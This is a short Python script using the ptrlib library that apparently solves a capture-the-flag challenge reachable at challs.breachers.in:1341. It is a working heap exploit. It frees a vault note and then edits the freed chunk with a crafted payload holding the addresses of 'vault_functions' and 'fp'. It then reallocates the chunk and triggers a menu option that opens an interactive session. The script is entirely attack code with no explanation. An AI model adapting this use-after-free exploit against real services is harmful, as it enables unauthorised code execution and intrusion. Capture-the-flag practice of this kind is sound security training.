from ptrlib import *

elf = ELF("./main")

fake_block_addr = elf.symbol("vault_functions")
fp_addr = elf.symbol("fp")

CHUNK_SIZE = 0x80

# p = Process("./main")
p = Socket("challs.breachers.in", "1341")

p.recvuntil(b"Your choice: ")
p.sendline(b"1")
p.recvuntil(b"Enter your vault note")
p.sendline(b"Initial vault note")

p.recvuntil(b"Your choice: ")
p.sendline(b"3")
p.recvuntil(b"Deleting your vault entry...")

p.recvuntil(b"Your choice: ")
p.sendline(b"2")
p.recvuntil(b"Enter new vault note")

payload = p64(fake_block_addr) + p64(fp_addr) + b"\xab" * 32 + p64(0x07)
payload = payload.ljust(CHUNK_SIZE, b"\x00")
p.sendline(payload)

p.recvuntil(b"Your choice: ")
p.sendline(b"4")
p.recvuntil(b"New vault entry allocated at: ")

p.recvuntil(b"Your choice: ")
p.sendline(b"5")
p.interactive()
